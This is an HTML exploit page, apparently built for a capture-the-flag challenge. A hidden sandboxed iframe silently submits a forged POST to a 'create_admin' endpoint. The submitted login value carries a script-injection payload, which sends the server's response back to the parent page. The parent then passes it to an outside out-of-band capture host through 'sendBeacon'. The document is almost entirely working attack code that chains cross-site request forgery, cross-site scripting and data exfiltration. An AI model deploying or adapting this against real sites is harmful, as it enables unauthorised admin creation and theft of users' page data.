<!DOCTYPE html>
<html>
<body>
<iframe id="n" sandbox="allow-scripts allow-forms" style="display:none"></iframe>
<script>
const inner = `
  <!DOCTYPE html>
  <html>
  <body>
  <form id="p" action="https://tasks.goidactf.ru:20431/create_admin" method="POST">
    <input type="hidden" name="new_admin_login" value="<script>parent.postMessage({type:'xss',data:document.body.innerHTML},'*')<\/script>">
  </form>
  <script>
    document.getElementById('p').submit();
  <\/script>
  </body>
  </html>
`;
document.getElementById('n').srcdoc = inner;

window.addEventListener("message", e => {
  if (e.data && e.data.type === 'xss') {
    // XSS сработала! Получили ответ сервера
    navigator.sendBeacon(
      "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/xss_capture",
      e.data.data.substring(0, 2000)
    );
  }
});
</script>
